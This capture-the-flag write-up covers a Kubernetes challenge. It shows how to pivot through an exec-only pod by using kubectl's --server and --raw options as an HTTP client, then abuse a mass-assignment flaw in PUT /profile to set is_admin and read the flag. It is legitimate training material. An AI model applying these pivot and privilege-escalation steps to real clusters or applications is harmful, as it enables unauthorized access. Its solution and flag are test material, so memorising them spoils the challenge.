# kurl

**Category:** misc (kubernetes) · **Points:** 72 · **Solves:** 140 · **Author:** p4ck3t0

## Challenge

"Kubernetes is the new Curl!" — an instance-only challenge: there is no handout
archive, the instance page hands out a `kubeconfig` for a service account in the
namespace `ctf`, and that is the entire interface.

## TL;DR

The service account may only open an `exec` into a single pod, `player-shell`.
That pod holds no credentials and no tools apart from `/bin/sh` and `kubectl`,
but it is the one workload the network policy lets talk to the internal
`flag-server` HTTP service. So `kubectl` itself becomes the HTTP client
(`--server` + `--raw` = method + URL). The app behind `flag-server` ("Vaultboard")
hands out a session token on registration and accepts `is_admin` from the very
first `PUT /profile`, so a fresh account becomes an administrator and the
dashboard prints the flag.

## Files

| file | description |
|---|---|
| `kubeconfig.yaml` | downloaded from the instance page: service account `ctf-player`, namespace `ctf` |

There is no handout archive. Tools: `kubectl` (any recent release, e.g. 1.34.1),
optionally `jq`. No cluster-admin rights are needed.

## Analysis

### What the kubeconfig allows

```bash
export KUBECONFIG=$PWD/kubeconfig.yaml
kubectl auth can-i --list -n ctf
```

Trimmed to the rows that matter:

```
Resources                        Resource Names     Verbs
pods                             []                 [get list]
services                         []                 [get list]
pods/exec                        [player-shell]     [create]
networkpolicies.networking...    []                 [get list]
```

The `exec` rule is bound to one resource name, so `kubectl exec` into the
`flag-server` pod is answered with `Forbidden`, while `player-shell` is allowed.

### `player-shell` is a network position, not a credential

```bash
kubectl -n ctf get pods
kubectl exec -n ctf player-shell -- ls /var/run/secrets/kubernetes.io/serviceaccount
```

The second command finds nothing: no service-account token is projected into
that pod. The container has exactly two useful files, `/bin/sh` and
`/usr/local/bin/kubectl`. What it does have is a network policy that permits
egress to `flag-server`, a service that is not reachable from outside the
cluster. So the pod is the intended pivot, and the only HTTP client available
inside it is `kubectl`.

### The HTTP client

`kubectl --server=<url> get --raw <path>` performs a plain GET against an
arbitrary URL and does not need a kubeconfig at all when `--server` is given:

```bash
kubectl exec -n ctf player-shell -- \
  /usr/local/bin/kubectl --server=http://flag-server get --raw /
```

That returns the "Vaultboard" index page, and

```bash
kubectl exec -n ctf player-shell -- \
  /usr/local/bin/kubectl --server=http://flag-server get --raw /openapi.yaml
```

documents three routes: `POST /register`, `PUT /profile`, `GET /dashboard`.
Authentication is a token passed as a query parameter — there are no cookies.

## Solution

### 1. Get the kubeconfig

Open the instance page and download the offered `kubeconfig` as
`kubeconfig.yaml`. The download endpoint may answer with a "cluster is still
starting" message for the first minute or two; retry until it returns YAML.

```bash
export KUBECONFIG=$PWD/kubeconfig.yaml
kubectl -n ctf get pods
```

### 2. Get a `kubectl` (skip if you already have one)

```bash
OS=$(uname -s | tr 'A-Z' 'a-z')
ARCH=$(uname -m | sed 's/x86_64/amd64/; s/aarch64/arm64/')
curl -sSLo /tmp/kubectl "https://dl.k8s.io/release/v1.34.1/bin/$OS/$ARCH/kubectl"
chmod +x /tmp/kubectl
```

### 3. Look at the app from inside the cluster

```bash
kubectl exec -n ctf player-shell -- \
  /usr/local/bin/kubectl --server=http://flag-server get --raw /
```

observed: the Vaultboard landing page. `/openapi.yaml` (same command, different
path) lists the three routes above.

### 4. Register

`create --raw` is a POST, `-f -` reads the body from stdin, and `exec -i` keeps
stdin open:

```bash
kubectl exec -i -n ctf player-shell -- \
  /usr/local/bin/kubectl --server=http://flag-server create --raw /register -f - <<'JSON'
{"username":"uid0","password":"pw"}
JSON
```

observed: the response body is the dashboard page and contains the session token
in the clear, as a line of the form

```
Session token: <16 hex characters>
```

Export it:

```bash
TOK=<the 16 hex characters>
```

### 5. Promote yourself

`PUT /profile` takes the same JSON as registration, but it does not filter the
fields it accepts — `is_admin` is simply written to the user record:

```bash
kubectl exec -i -n ctf player-shell -- \
  /usr/local/bin/kubectl --server=http://flag-server \
  replace --raw "/profile?token=$TOK" -f - <<'JSON'
{"username":"uid0","password":"pw","is_admin":true}
JSON
```

observed: `200`, the profile page now renders an "admin" badge.

### 6. Read the dashboard

```bash
kubectl exec -n ctf player-shell -- \
  /usr/local/bin/kubectl --server=http://flag-server get --raw "/dashboard?token=$TOK"
```

The token is now an administrator's, so the dashboard renders the flag for
admins only.

## Flag

```
flag{kubectl_1s_just_curl_w1th_3xtr4_st3ps}
```

## Notes

- `kubectl get --raw` / `create --raw` / `replace --raw` map to GET / POST / PUT.
  Together with `-f -` that is a complete `curl` replacement, which is exactly
  the joke in the title: the only client you are given inside the cluster is
  `kubectl`.
- The `pods/exec` rule uses `resourceNames`, so it is a real restriction, not
  just a namespace boundary. The interesting part of the design is that the
  network policy, not RBAC, keeps `player-shell` away from everything except
  `flag-server`.
- If `exec` complains that the container name is ambiguous, add `-c player-shell`.
- The mass assignment in `PUT /profile` is a plain missing allow-list: the
  update path reuses the registration schema and copies every known key,
  including `is_admin`.
